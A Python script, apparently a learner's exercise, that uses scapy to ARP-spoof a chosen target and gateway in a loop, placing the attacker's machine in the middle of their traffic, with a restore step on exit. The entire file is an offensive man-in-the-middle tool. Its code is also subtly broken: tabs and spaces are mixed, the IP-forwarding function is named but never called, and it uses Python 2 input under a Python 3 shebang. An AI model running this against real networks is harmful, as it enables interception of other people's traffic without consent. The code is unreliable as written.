#!/usr/bin/env python3

import scapy.all as scapy
import subprocess
import sys
import time

def forward_packets():
    openfile = open('/proc/sys/net/ipv4/ip_forward', 'w')
    openfile.write('1')
    openfile.close()
    
def forward_packets_restore():
    openfile = open('/proc/sys/net/ipv4/ip_forward', 'w')
    openfile.write('0')
    openfile.close()
	
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request #append arp_request to broadcast and store as new variable arp_request_broadcast
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore_arp(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	#print(packet.show()) - show what is in hte packet being sent
	#print(packet.summary())
	scapy.send(packet, verbose=False)
	
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
	
target_ip = raw_input("Enter IP of target computer: ")
spoof_ip = raw_input("Enter IP of computer to spoof (usually the gateway): ")

forward_packets

sent_packets_count = 0
try:
    while True:
	    spoof(target_ip, spoof_ip)
		spoof(spoof_ip, target_ip)
		sent_packets_count += 2
		print("\r[+] Packets sent " + str(sent_packets_count)), #comma specifies to NOT print new line;
		#places output into a buffer
		#\r is a string literal - tells to always print statement from start of line, overwriting last]
		sys.stdout.flush() #flush buffer, print to screen instantly
		time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Stopping ARP spoof, resetting ARP tables")
	restore_arp(target_ip, spoof_ip)
	restore_arp(spoof_ip, target_ip)
